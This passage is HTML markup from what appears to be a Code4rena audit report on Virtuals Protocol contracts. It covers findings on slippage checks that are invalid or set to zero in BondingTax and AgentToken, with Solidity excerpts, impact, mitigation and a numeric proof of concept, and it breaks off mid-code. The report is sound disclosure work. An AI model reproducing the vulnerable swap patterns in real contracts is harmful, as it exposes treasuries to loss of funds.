class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) + \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebob\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-06-bondingtax-has-invalid-slippage-implementation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-06-bondingtax-has-invalid-slippage-implementation\" aria-label=\"m 06 bondingtax has invalid slippage implementation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-14\"\u003e[M-06] \u003ccode\u003eBondingTax\u003c/code\u003e has invalid slippage implementation\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-631\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-307\"\u003e0x1982us\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-243\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-586\"\u003eDamola0x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-300\"\u003ekodyvim\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-442\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-798\"\u003eMatin\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-435\"\u003eslowbugmayor\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eIn BondingTax.sol, \u003ccode\u003eswapForAsset\u003c/code\u003e will swap \u003ccode\u003etaxTokens\u003c/code\u003e to \u003ccode\u003eassetToken\u003c/code\u003e through uniswap router. \u003c/p\u003e\n\u003cp\u003eThe issue is that the slippage calculation (\u003ccode\u003eminOutput\u003c/code\u003e) is invalid. Currently, \u003ccode\u003emintOutput\u003c/code\u003e is a percentage that is based on \u003ccode\u003erouter.getAmountsOut(amount, path)\u003c/code\u003e. Since \u003ccode\u003erouter.getAmountsOut(amount, path)\u003c/code\u003e is also dynamic based on the actual uniswapV2pair spot price; this means \u003ccode\u003eminOutput\u003c/code\u003e will simply be a fraction of the actual swap result. The slippage check will always pass.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyBondingRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e...       \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e|\u0026gt;      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Failed to fetch token price\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_slippage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e |\u0026gt;     \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminOutput\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etreasury\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e300\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSwapExecuted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSwapFailed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L143\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L143\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eInvalid slippage check allows any swap-out result, causing the treasury to lose the value of collected tax. Note that, even though the base chain has a low risk of front-running attack, the loss due to slippage happens naturally during normal trading activities.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eSlippage needs to be based on an expected price. Given \u003ccode\u003eswapForAsset\u003c/code\u003e is only intended to be invoked by BondingRouter, consider implementing a trusted on-chain oracle price reporting and basing the slippage calculation on the on-chain price.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-9\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eSuppose 10000 virtual = 1 WBTC, due to a previous trading, price drops to 10000 virtual = 0.0833 WBTC. 1% slippage based on expected price: 0.099 WBTC.\u003c/p\u003e\n\u003cp\u003eIn \u003ccode\u003eswapForAsset\u003c/code\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eBondingTax calculates \u003ccode\u003eminOutput\u003c/code\u003e with 1% slippage\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eminOutput = 0.0833 WBTC * (10000 - 100) / 10000 = 0.0825 WBTC\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eBondingTax executes swap with these parameters:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003erouter.swapExactTokensForTokens(\u003c/code\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"53\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1000 VIRTUAL,      // amountIn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e0.0825 WBTC,       // minOutput (1% less than minOutput)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e[VIRTUAL, WBTC],   // path\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003etreasury,          // recipient\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eblock.timestamp + 300  // deadline\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe swap executes at the worse price:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTreasury receives approximately 0.0833 WBTC \u003ccode\u003e\u0026#x3C;\u003c/code\u003e 0.099 WBTC.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003ccode\u003eswapForAsset\u003c/code\u003e accepts unbounded slippage.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage\" style=\"position:relative;\"\u003e\u003ca href=\"#m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage\" aria-label=\"m 07 amountoutmin passed in as 0 in agenttoken_swaptax leads to loss of funds due to slippage permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-15\"\u003e[M-07] \u003ccode\u003eamountOutMin\u003c/code\u003e passed in as 0 in \u003ccode\u003eAgentToken::_swapTax\u003c/code\u003e leads to loss of funds due to slippage\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-623\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-733\"\u003e0x60scs\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-244\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-247\"\u003eanchabadze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-574\"\u003ebytesguard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-198\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-757\"\u003eDanielTan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-3\"\u003edebo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-9\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-396\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-801\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-240\"\u003eodessos42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-796\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-681\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-441\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-776\"\u003eTopmark\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-722\"\u003eunique\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L793\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L793\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-4\" aria-label=\"finding description 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L784\"\u003e\u003ccode\u003eAgentToken::_swapTax\u003c/code\u003e\u003c/a\u003e is called via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L731\"\u003e\u003ccode\u003eAgentToken::_autoSwap\u003c/code\u003e\u003c/a\u003e whenever a \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L609\"\u003e\u003ccode\u003eAgentToken::_transfer\u003c/code\u003e\u003c/a\u003e call takes place.\u003c/p\u003e\n\u003cp\u003eOn further inspection, it can be observed that \u003ccode\u003e_swapTax\u003c/code\u003e internally calls uniswap router’s \u003ccode\u003eswapExactTokensForTokensSupportingFeeOnTransferTokens\u003c/code\u003e function where \u003ccode\u003eamountOutMin\u003c/code\u003e is passed as 0.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_swapTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapBalance_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtractBalance_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan 